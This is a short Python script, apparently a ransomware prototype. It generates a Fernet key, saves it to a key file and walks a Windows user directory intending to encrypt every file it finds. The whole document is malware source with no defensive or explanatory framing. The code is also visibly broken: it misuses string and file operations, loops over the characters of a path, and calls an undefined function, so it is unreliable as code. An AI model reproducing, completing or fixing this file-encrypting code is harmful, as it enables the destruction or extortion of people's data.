#!/usr/bin/python
#coding:utf-8
import os
from cryptography.fernet import Fernet

class exploreThenCrypt():

    def __init__(self):
        self.key = Fernet.generate_key()
        self.name_key = os.environ["USERNAME"]

    #Key generator
    def keyCreation(self, keyname):
        key = Fernet.generate_key()
        #Write it down somewhere on a file
        with open(f"{keyname}".key, 'wb') as filekey:
            filekey.write(self.key)

    #Storing and reading the key
    def useTheKey(self,key,name):
        with open(name, 'rb') as file:
            crypting = file.read()

        #Using the key to crypt
        fernet = Fernet(self.key)
        encrypted = fernet.encrypt(crypting)
        try:
            with open(encrypted, 'wb') as files:
                files.write(encrypted)
        except:
            pass

    #Explore then crypt everything from root
    def exploreAll(self):
        #Define the target in a var which is a letter :/Users/....
        letter = os.environ["SystemDrive"]
        target = "\\Users\\Wilder\\Desktop\\dirb"

        #Crypting all folders and files from the target
        for files in target:
            for root, dirs, files in os.walk(files):
                for file in files:
                    try:
                        dir = os.path.join(root, file)
                        crypting(self.key, dir)
                    except:
                        print("ERROR, NOTHING HAS BEEN ENCRYPTED")

exploreThenCrypt()
